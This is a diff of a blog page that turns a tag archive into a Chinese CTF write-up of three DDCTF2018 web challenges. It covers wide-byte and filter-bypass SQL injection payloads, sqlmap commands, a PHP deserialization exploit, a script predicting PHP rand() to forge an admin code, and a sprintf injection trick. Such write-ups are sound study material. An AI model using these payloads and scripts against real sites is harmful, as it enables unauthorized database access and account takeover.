@@ -6,17 +6,21 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="K4ngx.github.io">
-  <title>Tag: writeup | K4ng&#39;s blog</title>
+  <title>DDCTF2018_部分Web_wp | K4ng&#39;s blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="FZU 15级本科生">
-<meta property="og:type" content="website">
-<meta property="og:title" content="K4ng&#39;s blog">
-<meta property="og:url" content="K4ngx.github.io/tags/writeup/index.html">
+  <meta name="description" content="只做出了第一题，然后就卡在第二题的Java了。。蛋疼。。闯关式的比赛。。也挺蛋疼。看不到后面的题目。。题目开放一年。参考了大佬的writeup，复现了一下其中三题Web。  https://clannad.me/ddctf.md.htmlhttp://sec2hack.com/ctf/ddctf-2018-web-writeup.html  0x01 数据库的秘密常规sql注入。修改XFF头进入页">
+<meta name="keywords" content="writeup">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DDCTF2018_部分Web_wp">
+<meta property="og:url" content="K4ngx.github.io/2018/05/01/ddctf/index.html">
 <meta property="og:site_name" content="K4ng&#39;s blog">
-<meta property="og:description" content="FZU 15级本科生">
+<meta property="og:description" content="只做出了第一题，然后就卡在第二题的Java了。。蛋疼。。闯关式的比赛。。也挺蛋疼。看不到后面的题目。。题目开放一年。参考了大佬的writeup，复现了一下其中三题Web。  https://clannad.me/ddctf.md.htmlhttp://sec2hack.com/ctf/ddctf-2018-web-writeup.html  0x01 数据库的秘密常规sql注入。修改XFF头进入页">
+<meta property="og:image" content="https://i.imgur.com/boKIrUn.png">
+<meta property="og:updated_time" content="2018-05-10T12:50:45.584Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="K4ng&#39;s blog">
-<meta name="twitter:description" content="FZU 15级本科生">
+<meta name="twitter:title" content="DDCTF2018_部分Web_wp">
+<meta name="twitter:description" content="只做出了第一题，然后就卡在第二题的Java了。。蛋疼。。闯关式的比赛。。也挺蛋疼。看不到后面的题目。。题目开放一年。参考了大佬的writeup，复现了一下其中三题Web。  https://clannad.me/ddctf.md.htmlhttp://sec2hack.com/ctf/ddctf-2018-web-writeup.html  0x01 数据库的秘密常规sql注入。修改XFF头进入页">
+<meta name="twitter:image" content="https://i.imgur.com/boKIrUn.png">
   
     <link rel="alternative" href="/atom.xml" title="K4ng&#39;s blog" type="application/atom+xml">
   
@@ -150,240 +154,129 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-ddctf" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2018" class="archive-year">2018</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/05/01/Redhat_wp/" class="archive-article-date">
-  	<time datetime="2018-05-01T15:24:20.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-05-01</time>
-</a>
-        </div>
-    	 
+      <header class="article-header">
+        
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/05/01/Redhat_wp/">红帽杯2018_Writeup</a>
+    <h1 class="article-title" itemprop="name">
+      DDCTF2018_部分Web_wp
     </h1>
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">writeup</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/05/01/ddctf/" class="archive-article-date">
+        
+        <a href="/2018/05/01/ddctf/" class="archive-article-date">
   	<time datetime="2018-05-01T09:29:28.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-05-01</time>
 </a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/05/01/ddctf/">DDCTF2018_部分Web_wp</a>
-    </h1>
-  
+        
+      </header>
+    
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">writeup</a>
-        		</li>
+
+    
+        <p class="show-toc-btn" id="show-toc-btn" onclick="showToc();" style="display:none">
+            <span class="btn-bg"></span>
+            <span class="btn-text">文章导航</span>
+          </p>
+	<div id="toc-article" class="toc-article">
+	    <span id="toc-close" class="toc-close" title="隐藏导航" onclick="showBtn();">×</span>
+		<strong class="toc-title">文章目录</strong>
+           <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-数据库的秘密"><span class="toc-number">1.</span> <span class="toc-text">0x01 数据库的秘密</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-注入的奥妙"><span class="toc-number">2.</span> <span class="toc-text">0x02 注入的奥妙</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-我的博客"><span class="toc-number">3.</span> <span class="toc-text">0x03 我的博客</span></a></li></ol>
+         </div>
+   <script type="text/javascript">
+	function showToc(){
+		var toc_article = document.getElementById("toc-article");
+		var show_toc_btn = document.getElementById("show-toc-btn");
+		toc_article.setAttribute("style","display:block");
+		show_toc_btn.setAttribute("style","display:none");
+		};
+	function showBtn(){
+		var toc_article = document.getElementById("toc-article");
+		var show_toc_btn = document.getElementById("show-toc-btn");
+		toc_article.setAttribute("style","display:none");
+		show_toc_btn.setAttribute("style","display:block");
+		};
+   </script>
       		
-		</ul>
-	</div>
 
-          
 
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/04/30/ciscn2018/" class="archive-article-date">
-  	<time datetime="2018-04-30T07:17:24.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-04-30</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/04/30/ciscn2018/">国赛2018_Run_python继承链bypass</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">writeup</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">python</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/04/25/starctf2018-SimpleWeb-wp/" class="archive-article-date">
-  	<time datetime="2018-04-25T15:43:25.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-04-25</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/04/25/starctf2018-SimpleWeb-wp/">StarCTF2018_SimpleWeb_writeup</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">writeup</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/03/14/N1CTF2018-Easyphp-WP/" class="archive-article-date">
-  	<time datetime="2018-03-13T17:03:01.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-03-14</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/03/14/N1CTF2018-Easyphp-WP/">N1CTF2018_Easyphp_WP</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">writeup</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
+    <div class="article-entry" itemprop="articleBody">
       
-        </div></section>
+        <p>只做出了第一题，然后就卡在第二题的Java了。。蛋疼。。<br>闯关式的比赛。。也挺蛋疼。看不到后面的题目。。<br>题目开放一年。参考了大佬的writeup，复现了一下其中三题Web。</p>
+<blockquote>
+<p><a href="https://clannad.me/ddctf.md.html" target="_blank" rel="external">https://clannad.me/ddctf.md.html</a><br><a href="http://sec2hack.com/ctf/ddctf-2018-web-writeup.html" target="_blank" rel="external">http://sec2hack.com/ctf/ddctf-2018-web-writeup.html</a></p>
+</blockquote>
+<h2 id="0x01-数据库的秘密"><a href="#0x01-数据库的秘密" class="headerlink" title="0x01 数据库的秘密"></a>0x01 数据库的秘密</h2><p>常规sql注入。修改XFF头进入页面，有一个hidden字段<code>author</code>。<br>正常搜索了几波，发现请求时会带上GET参数<code>sig</code>和<code>time</code>。<br>查看了下JS代码可知，time是单纯的秒级时间戳，sig是请求内容拼接上变量<code>key</code>之后sha1的哈希值。（key在HTML源码里）</p>
+<p>利用flask转发HTTP数据包。</p>
+<a id="more"></a>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</div><div class="line"><span class="keyword">import</span> requests, time, hashlib</div><div class="line">app = Flask(__name__)</div><div class="line"></div><div class="line"><span class="meta">@app.route("/",methods=['POST'])</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello</span><span class="params">()</span>:</span></div><div class="line">    a = request.form.get(<span class="string">'author'</span>)</div><div class="line">    key = <span class="string">"adrefkfweodfsdpiru"</span></div><div class="line">    t = int(time.time())</div><div class="line">    sig = hashlib.sha1(<span class="string">"id=title=author=&#123;&#125;date=time=&#123;&#125;"</span>.format(a, t) + key).hexdigest()</div><div class="line">    urlappend = <span class="string">"sig=&#123;&#125;&amp;time=&#123;&#125;"</span>.format(sig, t)</div><div class="line">    r = requests.post(<span class="string">'http://116.85.43.88:8080/ZODGIRYTDIETBCSI/dfe3ia/index.php?'</span>+ urlappend, data=&#123;<span class="string">'id'</span>:<span class="string">''</span>, <span class="string">'title'</span>:<span class="string">''</span>,<span class="string">'date'</span>:<span class="string">''</span>,<span class="string">'author'</span>:a,<span class="string">'button'</span>:<span class="string">'search'</span>&#125;, headers=&#123;<span class="string">'X-Forwarded-For'</span>:<span class="string">'123.232.23.245'</span>&#125;)</div><div class="line">    <span class="keyword">return</span> r.content</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ ==<span class="string">'__main__'</span>:</div><div class="line">    app.run(host=<span class="string">'0.0.0.0'</span>, port=<span class="number">8000</span>)</div></pre></td></tr></table></figure>
+<p>然后就丢sqlmap跑吧，注意这里<code>or</code>和<code>and</code>是被拦了，要用<code>||</code>和<code>&amp;&amp;</code>绕一下，使用<code>--tamper=symboliclogical</code>。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sqlmap -r a.txt --level=3 --risk=3 --tamper=symboliclogical</div></pre></td></tr></table></figure>
+<h2 id="0x02-注入的奥妙"><a href="#0x02-注入的奥妙" class="headerlink" title="0x02 注入的奥妙"></a>0x02 注入的奥妙</h2><p>注释中提示了BIG5编码。选了后一个字节为5C的<code>么</code>字，可以宽字节注入。由于<code>&lt;&gt;</code>会被replace成空，并且对关键字的过滤并不是循环过滤。因此可以双写绕过或者在关键字中插入<code>&lt;&gt;</code>。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">-1么&apos;uni&lt;&gt;on%20select%20id,pattern,action%20from%20route_rules%23</div></pre></td></tr></table></figure>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">id</th>
+<th style="text-align:left">pattern</th>
+<th style="text-align:left">action</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">1</td>
+<td style="text-align:left">get*/</td>
+<td style="text-align:left">u/well/getmessage/</td>
+</tr>
+<tr>
+<td style="text-align:left">12</td>
+<td style="text-align:left">get*/</td>
+<td style="text-align:left">u/justtry/self/</td>
+</tr>
+<tr>
+<td style="text-align:left">13</td>
+<td style="text-align:left">post*/</td>
+<td style="text-align:left">u/justtry/try</td>
+</tr>
+<tr>
+<td style="text-align:left">15</td>
+<td style="text-align:left">static/bootstrap/css/backup.css</td>
+<td style="text-align:left">static/bootstrap/css/backup.zip</td>
+</tr>
+</tbody>
+</table>
+<p>访问<code>/static/bootstrap/css/backup.css</code>即可拿到源码。</p>
+<p>在<code>/Helper/Test.php</code>的<code>getflag()</code>方法中输出了flag。<code>$this-&gt;fl-&gt;get($user)</code>可知<code>$this-&gt;fl</code>为<code>Helper/Flag.php</code>中<code>Flag</code>类的一个实例。代码审计时可发现在<code>/Controller/JJusttry.php</code>的<code>try($serialize)</code>方法中存在反序列化漏洞。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="comment">// Test.php</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></div><div class="line">&#123;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> $user_uuid;</div><div class="line">    <span class="keyword">public</span> $fl;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getflag</span><span class="params">($m = <span class="string">'ctfuser'</span>, $u = <span class="string">'default'</span>)</span></span></div><div class="line">    &#123;</div><div class="line">        <span class="comment">//<span class="doctag">TODO:</span> check username</span></div><div class="line">        $user=<span class="keyword">array</span>(</div><div class="line">            <span class="string">'name'</span> =&gt; $m,</div><div class="line">            <span class="string">'id'</span> =&gt; $u</div><div class="line">        );</div><div class="line">        <span class="comment">//懒了直接输出给你们了</span></div><div class="line">        <span class="keyword">echo</span> <span class="string">'DDCTF&#123;'</span>.<span class="keyword">$this</span>-&gt;fl-&gt;get($user).<span class="string">'&#125;'</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// Flag.php</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">public</span> $sql;</div><div class="line"></div><div class="line">    <span class="comment">//</span></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></div><div class="line">    &#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;sql=<span class="keyword">new</span> SQL();</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="comment">//</span></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($user)</span></span></div><div class="line">    &#123;</div><div class="line"></div><div class="line">        $tmp=<span class="keyword">$this</span>-&gt;sql-&gt;FlagGet($user);</div><div class="line">        <span class="keyword">if</span> ($tmp[<span class="string">'status'</span>]===<span class="number">1</span>) &#123;</div><div class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;sql-&gt;FlagGet($user)[<span class="string">'flag'</span>];</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// SQL.php</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">SQL</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">public</span> $dbc;</div><div class="line">    <span class="keyword">public</span> $pdo;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// Justtry.php</span></div><div class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">try</span><span class="params">($serialize)</span></span></div><div class="line">&#123;</div><div class="line">    unserialize(urldecode($serialize), [<span class="string">"allowed_classes"</span> =&gt; [<span class="string">"Index\Helper\Flag"</span>, <span class="string">"Index\Helper\SQL"</span>,<span class="string">"Index\Helper\Test"</span>]]);</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<p>通过构造字符串，根据路由规则POST数据到<code>justtry/try</code>，反序列化后可构建一个<code>Test</code>实例。即可输出flag。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">namespace</span> <span class="title">Index</span>\<span class="title">Helper</span>;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</div><div class="line">    <span class="keyword">public</span> $user_uuid;</div><div class="line">    <span class="keyword">public</span> $fl;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span> </span>&#123;</div><div class="line">    <span class="keyword">public</span> $sql;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></div><div class="line">    &#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;sql=<span class="keyword">new</span> SQL();</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">SQL</span> </span>&#123;</div><div class="line">    <span class="keyword">public</span> $dbc;</div><div class="line">    <span class="keyword">public</span> $pdo;</div><div class="line">&#125;</div><div class="line"></div><div class="line">$a = <span class="keyword">new</span> Test();</div><div class="line">$a-&gt;user_uuid = <span class="string">'79c78cb9-cdc1-4b05-a82c-a93face2ce19'</span>;</div><div class="line">$a-&gt;fl = <span class="keyword">new</span> Flag();</div><div class="line"></div><div class="line"><span class="keyword">echo</span> urlencode(serialize($a));</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<p><img src="https://i.imgur.com/boKIrUn.png" alt=""></p>
+<ul>
+<li><code>namespace</code> 指定命名空间</li>
+<li>在命名空间字符串过长时，使用<code>use</code>可以相应的缩短命名空间。</li>
+<li><a href="https://www.cnblogs.com/drunkhero/p/namespace.html" target="_blank" rel="external">https://www.cnblogs.com/drunkhero/p/namespace.html</a></li>
+</ul>
+<h2 id="0x03-我的博客"><a href="#0x03-我的博客" class="headerlink" title="0x03 我的博客"></a>0x03 我的博客</h2><p><code>rand()</code>和<code>str_shuffle()</code>的预测。在Linux中，PHP的<code>rand()</code>函数是调用glibc库中的rand函数，是有缺点的，可预测。详情看这里-&gt;<a href="http://www.sjoerdlangkemper.nl/2016/02/11/cracking-php-rand/" target="_blank" rel="external">Cracking PHP rand()</a>。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">rand[i] = (rand[i<span class="number">-3</span>] + rand[i<span class="number">-31</span>]) &amp; <span class="number">0x7fffffff</span></div></pre></td></tr></table></figure>
+<p>当取的随机数大于31位时，后面的随机数可通过上述式子推出，<strong>预测值有时会比实际值少1</strong></p>
+<p>由于<code>str_shuffle()</code>依赖 <code>rand()</code> 进行字符串随机操作。因此可通过预测<code>rand()</code>的值来预测出admin的code。而每一次的rand值可以从注册表单的csrf字段中获得。PHP的<code>str_shuffle()</code>可参考<a href="https://github.com/php/php-src/blob/PHP-5.6.35/ext/standard/string.c#L5394" target="_blank" rel="external"> PHP 5.6.35 string.c L5394</a></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> re</div><div class="line"></div><div class="line">PHP_RAND_MAX = <span class="number">0x7fffffff</span></div><div class="line">rand_list = []</div><div class="line">rand_count = <span class="number">35</span></div><div class="line">url = <span class="string">"http://116.85.39.110:5032/2096b322e99ffc1a59891b972c0fa612/register.php"</span></div><div class="line">s = requests.session()</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_rand_list</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> range(rand_count):</div><div class="line">        c = s.get(url)</div><div class="line">        rand_list.append(int(re.findall(<span class="string">'id="csrf" value="(\d+)"'</span>,c.text)[<span class="number">0</span>]))</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">php_rand</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">global</span> rand_count</div><div class="line">    xrand = (rand_list[rand_count - <span class="number">3</span>] + rand_list[rand_count - <span class="number">31</span>]) &amp; PHP_RAND_MAX</div><div class="line">    rand_list.append(xrand)</div><div class="line">    rand_count += <span class="number">1</span></div><div class="line">    <span class="keyword">return</span> xrand</div><div class="line"></div><div class="line"><span class="comment"># https://github.com/Sjord/crack-ezchatter-token/blob/master/crackseed.c</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">php_rand_range</span><span class="params">(n, nmin, nmax, tmax)</span>:</span></div><div class="line">    <span class="keyword">return</span> int(nmin + (nmax - nmin + <span class="number">1.0</span>) * (n / (tmax + <span class="number">1.0</span>)))</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">php_str_shuffle</span><span class="params">(s)</span>:</span></div><div class="line">    n_left = len(s)</div><div class="line">    s = list(s)</div><div class="line">    <span class="keyword">if</span> n_left &lt;= <span class="number">1</span>:</div><div class="line">        <span class="keyword">return</span></div><div class="line">    n_left -= <span class="number">1</span></div><div class="line">    <span class="keyword">while</span> n_left &gt; <span class="number">0</span>:</div><div class="line">        rnd_idx = php_rand();</div><div class="line">        rnd_idx = php_rand_range(rnd_idx, <span class="number">0</span>, n_left, PHP_RAND_MAX);</div><div class="line">        <span class="keyword">if</span> rnd_idx != n_left:</div><div class="line">            s[n_left], s[rnd_idx] = s[rnd_idx], s[n_left];</div><div class="line">        n_left -= <span class="number">1</span></div><div class="line">    <span class="keyword">return</span> <span class="string">''</span>.join(s)</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</div><div class="line">    get_rand_list()</div><div class="line">    csrf = rand_list[rand_count<span class="number">-1</span>]</div><div class="line">    code = <span class="string">"admin###"</span> + php_str_shuffle(<span class="string">'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'</span>)[:<span class="number">32</span>]</div><div class="line">    username = code[<span class="number">8</span>:<span class="number">13</span>]</div><div class="line">    data = &#123;</div><div class="line">        <span class="string">'csrf'</span>:csrf, </div><div class="line">        <span class="string">'username'</span>:username, </div><div class="line">        <span class="string">'password'</span>:<span class="string">'123'</span>,</div><div class="line">        <span class="string">'code'</span>: code</div><div class="line">    &#125;</div><div class="line">    con = s.post(url, data=data)</div><div class="line">    print(con.text)</div><div class="line">    print(<span class="string">'---------------------'</span>)</div><div class="line">    print(<span class="string">'username: '</span> + username + <span class="string">'\npassword: 123'</span>)</div><div class="line">    print(<span class="string">'code: '</span> + code)</div></pre></td></tr></table></figure>
+<p>运行脚本后可得到注册后admin身份的帐号密码。登录后，在<code>index.php</code>的源码中可发现存在<code>sprintf</code>注入漏洞。对于php中sprintf格式化字符串漏洞可见 <a href="https://paper.seebug.org/386/" target="_blank" rel="external">https://paper.seebug.org/386/</a></p>
+<p>简单的说就是sprintf中<code>%1$\&#39;</code>会将<code>\</code>吃掉，导致<code>&#39;</code>的逃逸。<code>%</code>后表示第几个参数，<code>$</code>表示参数类型。</p>
+<p>还有一个sprintf漏洞的利用方式：<code>%c</code>起到了类似<code>chr()</code>的效果，将数字39转化为<code>&#39;</code>，从而导致了sql注入。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line">$input1 = <span class="string">'%1$c) OR 1=1 #'</span>;</div><div class="line">$input2 = <span class="number">39</span>;</div><div class="line">$sql = <span class="string">"SELECT * FROM foo WHERE bar IN ('$input1') AND baz = %s"</span>;</div><div class="line">$sql = sprintf($sql, $input2);</div><div class="line"><span class="keyword">echo</span> $sql;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<p>在这题中，<code>--prefix</code>加个前缀丢进sqlmap跑就好了。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sqlmap -u <span class="string">'http://116.85.39.110:5032/2096b322e99ffc1a59891b972c0fa612/index.php?id=1&amp;title=a'</span> -p title --cookie=<span class="string">"PHPSESSID=65a15a2c6c93df292e2f2666e2aa31c8"</span> --prefix=<span class="string">"%1$'"</span></div></pre></td></tr></table></figure>
+<p>话说。。看了大佬的writeup才知道sqlmap有前缀<code>--prefix</code>和后缀<code>--suffix</code>这种东西。</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
       
       
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2017" class="archive-year">2017</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2017/09/30/bugkuctf-web-writeup/" class="archive-article-date">
-  	<time datetime="2017-09-30T06:53:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-09-30</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2017/09/30/bugkuctf-web-writeup/">bugkuctf_web_writeup</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
@@ -395,57 +288,98 @@
 		</ul>
 	</div>
 
-          
+      
 
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
